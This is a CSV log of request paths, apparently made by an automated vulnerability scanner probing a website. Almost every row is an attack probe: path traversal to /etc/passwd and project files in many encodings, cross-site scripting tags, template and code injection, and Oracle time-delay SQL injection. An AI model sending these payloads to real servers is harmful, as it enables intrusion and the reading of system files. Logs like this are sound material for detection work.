path,requests
/QzhJd8UJ/406,1
/v1/api/v1/page/'%22()&%%3Czzz%3E%3CScRiPt%20%3ETXwF(9087)%3C/ScRiPt%3E,1
/page/'\x22()&%25<zzz><ScRiPt%20>TXwF(9087)<%2fScRiPt>,1
/'+response.write(9896123*9254026)+'/406,1
/jhAq3J12:%20ksJerD6O/406,1
/page/4069953931,1
/\x22+response.write(9896123*9254026)+\x22/406,1
/page/XFIiQize,1
/page/bfg9512%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9hjl9512,1
/page/response.write(9429302*9215092),1
/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,1
/page/hgbNxipg:%20lLjbhzVa,1
/expr%209000852895%20-%20985856/406,1
/page/'+response.write(9429302*9215092)+',1
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd/406,1
/page/\x22+response.write(9429302*9215092)+\x22,1
/page/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,1
/js/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd,1
/section/dfb{{\x22abc\x22|title}}xca,1
/js/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/section/print(\x22dfb\x22%20.%2098991*97996%20.%20\x22xca\x22)%3b,1
/'%3bprint(md5(31337))%3b$a='/406,1
/section/98991*97996*98991*97996,1
/\x22%3bprint(md5(31337))%3b$a=\x22/406,1
/js/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd,1
/section/dfb{@math%20key=98991%20method=\x22multiply\x22%20operand=97996%2f}xca,1
/section/dfb{{{this}}}xca,1
/section/%23{98991*97996*98991*97996},1
/section/dfb%23{xca}=123,1
"/page'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'/406",1
/js/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd,1
/section/dfb{{'abcd'.toUpperCase()}}xca,1
/section/AAABBBCCC{{define%20\x22bla\x22}}bla{{end}}{{define%20\x22dfb\x22}}xyz{{end}}{{template%20\x22dfb\x22}}CCCBBBAAA,1
/page'\x22/406,1
/@@vPKH4/406,1
/js/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,1
/(select%20198766*667891)/406,1
/js/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd,1
/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,1
/js/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,1
/js/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd,1
/js/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,1
/js/%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C/etc/passwd,1
/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,1
/js/..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C/etc/passwd,1
/js/..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../....//etc/passwd,1
"/page/406*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)",1
"/page/406'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'",1
/js/..\x5C..\x5C..\x5C..\x5C..\x5C..\x5C..\x5C..\x5Cetc/passwd,1
/page/406'\x22,1
/page/@@tgLA3,1
/page/(select%20198766*667891),1
/js/%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5Cetc/passwd,1
/js/%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5Cetc/passwd,1
/page/expr%209000341509%20-%20940182,1
/http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg/406,1
/js/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc/passwd,1
/%2fetc%2fshells/406,1
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshells/406,1
/page/%2fetc%2fshells,1
/page/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshells,1
/page/'%3bprint(md5(31337))%3b$a=',1
/page/\x22%3bprint(md5(31337))%3b$a=\x22,1
/redirtest.acx/406,1
/page/redirtest.acx,1
/page&n950784=v998830/406,1
/page/406&n979033=v922602,1
/)/406,1
/!(()&&!|*|*|/406,1
/^(%23$!@%23$)(()))******/406,1
/js/\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../etc/passwd,1
/page/),1
/page/!(()&&!|*|*|,1
/page/^(%23$!@%23$)(()))******,1
/'\x22()/406,1
/js//..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5Cetc/passwd,1
/page/'\x22(),1
/js/.../.../.../.../.../.../.../.../etc/passwd,1
/book/electronicbook/914267%40,1
/book/electronicbook/914267%2540,1
/book/electronicbook\x22904429%40,1
/book/electronicbook\x22%3B%39%39%39%38%22%28%29%3B%7D%5D%39%35%30%37,1
/book/electronicbook\x22%25%33%42%25%33%39%25%33%34%25%33%38%25%33%30%25%32%32%25%32%38%25%32%39%25%33%42%25%37%44%25%35%44%25%33%39%25%33%37%25%33%32%25%33%30,1
/book/electronicbook\x22%3B%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%3E%76%62%49%50%28%39%34%30%33%29%3C%2F%73%63%72%69%70%74%3E,1
/book/electronicbook;989069%40,1
/book/electronicbook;%3B%39%30%39%34%22%28%29%3B%7D%5D%39%34%30%35,1
/book/electronicbook;%25%33%42%25%33%39%25%33%39%25%33%39%25%33%34%25%32%32%25%32%38%25%32%39%25%33%42%25%37%44%25%35%44%25%33%39%25%33%33%25%33%34%25%33%37,1
/book/electronicbook;%3B%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%3E%76%62%49%50%28%39%32%34%35%29%3C%2F%73%63%72%69%70%74%3E,1
/js/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc/passwd,1
/fr/catalogue/959858%40,1
/fr/catalogue/959858%2540,1
/js/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd,1
/fr/catalogue\x22908406%40,1
/fr/catalogue\x22908406%2540,1
/fr/catalogue;960046%40,1
/fr/catalogue;960046%2540,1
/js/.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5Cetc/passwd,1
/js/.\x5C..\x5C.\x5C..\x5C.\x5C..\x5C.\x5C..\x5C.\x5C..\x5C.\x5C..\x5C.\x5C..\x5C.\x5C..\x5Cetc/passwd,1
/section/newcenter/967142%40,1
/section/newcenter/967142%2540,1
/section/newcenter\x22904211%40,1
/section/newcenter\x22%3B%39%31%30%33%22%28%29%3B%7D%5D%39%34%35%33,1
/js//etc/shells,1
/section/newcenter\x22%25%33%42%25%33%39%25%33%30%25%33%35%25%33%33%25%32%32%25%32%38%25%32%39%25%33%42%25%37%44%25%35%44%25%33%39%25%33%33%25%33%37%25%33%31,1
/js/%2Fetc%2Fshells,1
/section/newcenter\x22%3B%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%3E%79%56%4E%76%28%39%33%37%33%29%3C%2F%73%63%72%69%70%74%3E,1
/section/newcenter;993369%40,1
/section/newcenter;%3B%39%36%32%39%22%28%29%3B%7D%5D%39%39%32%31,1
/section/newcenter;%25%33%42%25%33%39%25%33%37%25%33%34%25%33%35%25%32%32%25%32%38%25%32%39%25%33%42%25%37%44%25%35%44%25%33%39%25%33%33%25%33%31%25%33%36,1
/section/newcenter;%3B%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%3E%79%56%4E%76%28%39%37%39%36%29%3C%2F%73%63%72%69%70%74%3E,1
/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,1
/pmb_images/LC_POST_/942750%40,1
/pmb_images/LC_POST_/942750%2540,1
/pmb_images/LC_POST_\x22922272%40,1
/pmb_images/LC_POST_\x22922272%2540,1
/pmb_images/LC_POST_;945743%40,1
/pmb_images/LC_POST_;945743%2540,1
/v1/api/v1/facettesMultiCritere/920034%40,1
"/section/\x22dfbzzzzzzzzbbbccccdddeeexca\x22.replace(\x22z\x22,\x22o\x22)",1
/v1/api/v1/facettesMultiCritere/920034%2540,1
/section/mezzanine9777\x22()%3b}]9439,1
/section/%256D%2565%257A%257A%2561%256E%2569%256E%2565%2539%2531%2531%2534%2522%2528%2529%253B%257D%255D%2539%2534%2533%2536,1
/section/mezzanine<%2fscript><script>DN8Q(9532)<%2fscript>,1
/js/../Gemfile,1
/v1/api/v1/facettesMultiCritere\x22942582%40,1
/v1/api/v1/facettesMultiCritere\x22942582%2540,1
/js/../package.json,1
/js/../package-lock.json,1
/v1/api/v1/facettesMultiCritere;968915%40,1
/js/%2e%2e%2fGemfile,1
/v1/api/v1/facettesMultiCritere;968915%2540,1
/js/%2e%2e%2fpackage.json,1
/js/%2e%2e%2fpackage-lock.json,1
/js/../../Gemfile,1
/js/../../package.json,1
/js/../../package-lock.json,1
/js/%2e%2e%2f%2e%2e%2fGemfile,1
/js/%2e%2e%2f%2e%2e%2fpackage.json,1
/js/%2e%2e%2f%2e%2e%2fpackage-lock.json,1
/js/../../../Gemfile,1
/js/../../../package.json,1
/js/../../../package-lock.json,1
/js/%2e%2e%2f%2e%2e%2f%2e%2e%2fGemfile,1
/js/%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage.json,1
/js/%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage-lock.json,1
/js/../../../../Gemfile,1
/js/../../../../package.json,1
/js/../../../../package-lock.json,1
/js/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fGemfile,1
/js/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage.json,1
/js/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage-lock.json,1
/js/../../../../../Gemfile,1
/js/../../../../../package.json,1
/js/../../../../../package-lock.json,1
/js/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fGemfile,1
/js/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage.json,1
/js/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage-lock.json,1
/js/))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),1
/js/'\x22,1
/js/<!--,1
/js/appear.js'\x22()&%25<zzz><ScRiPt%20>Ozkt(9365)<%2fScRiPt>,1
/js/'\x22()&%25<zzz><ScRiPt%20>Ozkt(9341)<%2fScRiPt>,1
/js/appear.js9221486,1
/js/response.write(9788383*9994063),1
/js/'+response.write(9788383*9994063)+',1
/js/\x22+response.write(9788383*9994063)+\x22,1
/js/kf3SBsdd,1
/js/xHCiTvu3:%20VnpVsTlU,1
/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,1
/js/appear.jsu41F7Rws,1
/js/%2fetc%2fshells,1
/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshells,1
"/js/appear.js'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'",1
/js/appear.js'\x22,1
/js/learningcenter.um6p.ma%2f,1
/js/@@ez29p,1
/js/(select%20198766*667891),1
/js/appear.js&n907850=v994054,1
/js/),1
/js/!(()&&!|*|*|,1
/js/'\x22(),1
/js/^(%23$!@%23$)(()))******,1
/etageres//..//..//..//..//..//..//..//..//..//..//../etc/passwd,1
/etageres/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,1
/etageres//....//....//....//....//....//....//....//....//etc//passwd,1
/page//..//..//..//..//..//..//..//..//..//..//../etc/passwd,1
/page/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,1
/page//....//....//....//....//....//....//....//....//etc//passwd,1
/etageres/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,1
/etageres/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd,1
/etageres/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/page/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,1
/etageres/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd,1
/page/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd,1
/page/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/api//..//..//..//..//..//..//..//..//..//..//../etc/passwd,1
/etageres/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd,1
/page/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd,1
/api/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,1
/etageres/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,1
/api//....//....//....//....//....//....//....//....//etc//passwd,1
/page/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd,1
/etageres/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd,1
/page/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,1
/js/expr%209000241287%20-%20913612,1
/api/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,1
/etageres/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,1
/etageres/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,1
/page/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd,1
/etageres/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd,1
/api/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd,1
/page/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,1
/api/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/page/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,1
/etageres/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,1
/etageres/%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C/etc/passwd,1
/api/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd,1
/page/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd,1
/js/'%3bprint(md5(31337))%3b$a=',1
/page/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,1
/js/\x22%3bprint(md5(31337))%3b$a=\x22,1
/page/%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C/etc/passwd,1
/api/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd,1
/etageres/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,1
/api/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,1
/etageres/..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C/etc/passwd,1
/etageres/..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../....//etc/passwd,1
/api/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd,1
/page/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,1
/api/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,1
/api/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,1
/etageres/..\x5C..\x5C..\x5C..\x5C..\x5C..\x5C..\x5C..\x5Cetc/passwd,1
/page/..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C/etc/passwd,1
/page/..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../....//etc/passwd,1
/api/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd,1
/etageres/%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5Cetc/passwd,1
/api/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,1
/page/..\x5C..\x5C..\x5C..\x5C..\x5C..\x5C..\x5C..\x5Cetc/passwd,1
/api/%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C/etc/passwd,1
/etageres/%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5Cetc/passwd,1
/page/%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5Cetc/passwd,1
/etageres/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc/passwd,1
/api/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,1
/api/..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C..\x5C\x5C\x5C/etc/passwd,1
/api/..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../....//etc/passwd,1
/page/%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5Cetc/passwd,1
/api/..\x5C..\x5C..\x5C..\x5C..\x5C..\x5C..\x5C..\x5Cetc/passwd,1
/page/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc/passwd,1
/api/%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5C%2e%2e\x5Cetc/passwd,1
/api/%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5C%252e%252e\x5Cetc/passwd,1
/etageres/\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../etc/passwd,1
/api/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc/passwd,1
/etageres//..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5Cetc/passwd,1
/etageres/.../.../.../.../.../.../.../.../etc/passwd,1
/page/\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../etc/passwd,1
/page//..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5Cetc/passwd,1
/etageres/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc/passwd,1
/page/.../.../.../.../.../.../.../.../etc/passwd,1
/etageres/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd,1
/etageres/.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5Cetc/passwd,1
/api/\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../\x5C../etc/passwd,1
/etageres/.\x5C..\x5C.\x5C..\x5C.\x5C..\x5C.\x5C..\x5C.\x5C..\x5C.\x5C..\x5C.\x5C..\x5C.\x5C..\x5Cetc/passwd,1
/api//..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5C/..\x5Cetc/passwd,1
/api/.../.../.../.../.../.../.../.../etc/passwd,1
/etageres//etc/shells,1
/etageres/%2Fetc%2Fshells,1
/api/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc/passwd,1
/api/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd,1
/etageres/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,1
/api/.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5C.\x5C/\x5C.\x5Cetc/passwd,1
